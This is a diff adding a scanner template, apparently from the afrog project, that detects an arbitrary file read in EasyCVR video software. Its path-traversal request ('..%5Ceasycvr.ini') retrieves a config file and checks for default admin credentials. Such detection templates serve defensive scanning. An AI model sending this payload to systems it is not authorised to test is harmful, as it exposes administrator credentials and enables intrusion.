@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[user_default]'
+          - '[base_config]'
+          - default_admin_user
+          - default_admin_password
+          - default_admin_role_name
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/taillog/mediaserverlogs/..%5Ceasycvr.ini'
+id: xunfan-easycvr-taillog-mediaserverlogs-fileread
+info:
+  author: zan8in
+  description: 旭帆EasyCVR软件-taillog-mediaserverlogs任意文件读取
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 旭帆EasyCVR软件-taillog-mediaserverlogs任意文件读取
+  severity: high
+  tags: xunfan,easycvr,fileread,argus-import
